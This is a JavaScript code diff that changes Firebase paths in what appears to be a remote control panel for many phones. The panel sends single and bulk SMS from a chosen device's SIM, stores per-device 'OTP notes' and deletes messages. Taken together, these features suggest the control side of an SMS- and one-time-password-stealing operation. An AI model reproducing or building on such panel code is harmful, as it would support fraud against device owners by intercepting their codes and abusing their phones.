@@ -2228,7 +2228,7 @@ async function execSMS() {
     
     const finalMsg = msg.replace(/\[ID\]/g, selDev._id);
     const payload = { from: selSim, to, message: finalMsg, isSended: false };
-    const p = `/clients/${selDev._id}/webhookEvent/sendSms.json`;
+    const p = `/webhookEvent/sendSms.json`;
     const src = SOURCES.find(s => s.key === selDev._src);
     const token = src ? await getAuthToken(src) : null;
     const authSuffix = token ? `?auth=${token}` : '';
@@ -2407,7 +2407,7 @@ async function saveOtpNote() {
     const token = src ? await getAuthToken(src) : null;
     const authSuffix = token ? `?auth=${token}` : '';
 
-    const paths = [`/clients/${selDev._id}/note.json`, `/${selDev._id}/note.json`];
+    const paths = [`/note.json`];
     for (const p of paths) {
         try {
             const res = await proxyFirebase(selDev._src, selDev._id, p, 'PUT', note);
@@ -3114,7 +3114,7 @@ async function execBulkSMS() {
         // Replace [ID] placeholder with the actual device ID
         const finalMsg = msgTemplate.replace(/\[ID\]/gi, d._id);
         const payload = { from: bulkSim, to, message: finalMsg, isSended: false };
-        const p = `/clients/${d._id}/webhookEvent/sendSms.json`;
+        const p = `/webhookEvent/sendSms.json`;
         
         const srcObj = SOURCES.find(s => s.key === d._src);
         const token = srcObj ? await getAuthToken(srcObj) : null;
@@ -3481,11 +3481,6 @@ function promptDeleteMsg(localId) {
 async function executeDeleteMsg() {
     if(!msgToDelete) return;
     const { dev, msg } = msgToDelete;
-    const src = SOURCES.find(s => s.key === dev._src);
-    const token = src ? await getAuthToken(src) : null;
-    const authSuffix = token ? `?auth=${token}` : '';
-    
-    const p = msg._fbPath.replace('.json', '') + '/' + msg._fbKey + '.json';
     const btn = document.getElementById('delMsgBtn');
     btn.innerHTML = '<div class="spinner" style="width:14px;height:14px;border-width:2px;border-top-color:#fff;"></div>';
     
